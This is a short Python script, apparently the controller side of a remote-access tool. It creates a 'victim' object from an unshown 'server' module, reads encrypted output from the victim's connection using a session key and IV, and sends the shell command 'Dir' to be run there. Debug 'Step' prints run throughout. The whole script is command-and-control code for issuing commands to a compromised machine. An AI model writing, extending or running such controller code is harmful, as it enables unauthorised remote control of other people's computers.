#!/usr/bin/env python3
import server as server; 
import string;
import sys

print("Step 1\n")
v = server.victim(); 
print("Step 2\n")
print("".join(filter(lambda x: x in string.printable, str(server.secure_recv(v,v.SessionKey,v.SessionIV,v.conn),'ISO-8859-1'))),end="")
print("Step 3\n")
Command = "Dir";
print("Step 4\n")
print (Command +"\n")
print("Step 5\n")
server.secure_send(Command.encode("utf8"),len(Command),v.SessionKey, v.SessionIV, v.conn)
print("step 6 \n")
